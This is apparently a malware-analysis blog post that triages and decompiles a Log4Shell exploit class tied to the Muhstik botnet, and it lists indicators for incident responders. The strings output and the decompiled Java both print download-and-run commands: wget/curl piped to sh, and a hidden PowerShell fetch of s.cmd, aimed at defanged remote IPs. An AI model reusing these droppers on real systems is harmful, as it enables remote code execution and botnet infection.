---
layout: post
title: "Analyzing a Log4Shell log4j Exploit from Muhstik"
date: 2021-12-12
categories: Malware
tags: log4jshell malware java powershell muhstik
permalink: /analyzing-log4shell-muhstik/
---

In this post I set out to analyze a simple chunk of Log4Shell log4j exploit code to see how it works.

## Finding the Exploit

I wasn't running a honeypot or anything, I just figured I could rustle around VirusTotal and find one using this search:

`tag:java-bytecode positives:1+`

Out of the files I saw, I ended up settling on this simple one:

[https://www.virustotal.com/gui/file/2b5f04d15e459132a5935260746788db39b469ea46859c4a5bb8625f8a80bd41](https://www.virustotal.com/gui/file/2b5f04d15e459132a5935260746788db39b469ea46859c4a5bb8625f8a80bd41)

## Triaging for Indicators

If you're working an incident it helps to have some indicators you can feed over to the rest of your team to identify behaviors or other data. One of the easiest ways to find low-hanging indicators in malware is using the `strings` command.

```
remnux@remnux:~/cases/muhstik$ strings Exploit.class 

<init>
Code
LineNumberTable
<clinit>
StackMapTable
SourceFile
Exploit.java
java/lang/String
	/bin/bash
S(wget -qO - hxxp://18.228.7[.]109/.log/log || curl hxxp://18.228.7[.]109/.log/log) | sh
os.name
powershell
hidden
(new-object System.Net.WebClient).Downloadfile('hxxp://172.105.241[.]146:80/wp-content/themes/twentysixteen/s.cmd', 's.cmd');start-process s.cmd
java/lang/Exception
com/knal/muhstik/Exploit
java/lang/Object
[Ljava/lang/String;
java/lang/System
getProperty
&(Ljava/lang/String;)Ljava/lang/String;
toLowerCase
()Ljava/lang/String;
startsWith
(Ljava/lang/String;)Z
java/lang/Runtime
getRuntime
()Ljava/lang/Runtime;
exec
(([Ljava/lang/String;)Ljava/lang/Process;
java/lang/Process
waitFor
Ljava/io/PrintStream;
toString
java/io/PrintStream
println
(Ljava/lang/String;)V
```

Keep in mind that `strings` doesn't grab Unicode characters by default, so you'll need to run a second pass using `strings -eL`. In this case, I found no additional strings.

Useful indicators from this threat include:

- `hxxp://18.228.7[.]109/.log/log`
- `hxxp://172.105.241[.]146:80/wp-content/themes/twentysixteen/s.cmd`
- `com/knal/muhstik/Exploit`

The last string proves useful to find intelligence overlaps. The Muhstik botnet has used the strings `knal` and `muhstik` in parts of its exploitation [in the past](https://sysdig.com/blog/muhstik-malware-botnet-analysis/).

## Reversing to Java Source

Reversing the Java bytecode in a class file back to source is relatively easy, and I recommend using [JD-GUI](http://java-decompiler.github.io/) for the job. Pretty much all of the work is done for you (assuming the code isn't obfuscated) and you'll get a clean view of the code.

![JD-GUI Code Decompiler](/assets/images/analyzing-log4jshell-muhstik/muhstik-re-1.png)

This code is a simple example of cross-platform exploit code.

```java
String[] arrayOfString = { "/bin/bash", "-c", "(wget -qO - hxxp://18.228.7[.]109/.log/log || curl hxxp://18.228.7[.]109/.log/log) | sh" };

if (System.getProperty("os.name").toLowerCase().startsWith("win"))
	arrayOfString = new String[] { "powershell", "-w", "hidden", "-c", "(new-object System.Net.WebClient).Downloadfile('hxxp://172.105.241[.]146:80/wp-content/themes/twentysixteen/s.cmd', 's.cmd');start-process s.cmd" }; 

Runtime runtime = Runtime.getRuntime();
Process process = runtime.exec(arrayOfString);
process.waitFor();
```

The code uses [`System.getProperty()`](https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html) to determine if the server is running Windows or not. If it is, the code executes PowerShell with commands to [download](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0) `s.cmd` and then [execute](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process?view=powershell-7.2) it. If the server isn't running Windows, the code executes `curl` and/or `wget` commands depending on what is available on the exploited system.

The actual shell commands are kicked off by [`Runtime.exec`](https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html) and then the code waits for the commands to complete.